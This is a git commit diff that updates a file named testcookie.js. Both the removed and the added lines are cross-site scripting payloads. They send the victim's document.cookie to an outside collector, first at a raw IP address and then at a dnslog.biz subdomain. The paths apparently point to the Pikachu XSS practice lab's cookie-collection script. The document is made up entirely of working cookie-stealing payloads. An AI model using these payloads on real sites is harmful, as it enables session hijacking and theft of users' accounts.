0bca25a1f9f6f13e9bfbf1d2ea3af3a7c545b2d2
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 13:13:15 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,2 +1,2 @@
-<script>document.location = 'http://121.91.173.139:9001/pika/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
-<script>window.top.location.href=`http://121.91.173.139:9001/cooookie`%2bdocument.cookie;</script>
+<script>document.location = 'http://2548043c.dnslog.biz/pika/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
+<script>window.top.location.href=`http://2548043c.dnslog.biz/cooookie`%2bdocument.cookie;</script>
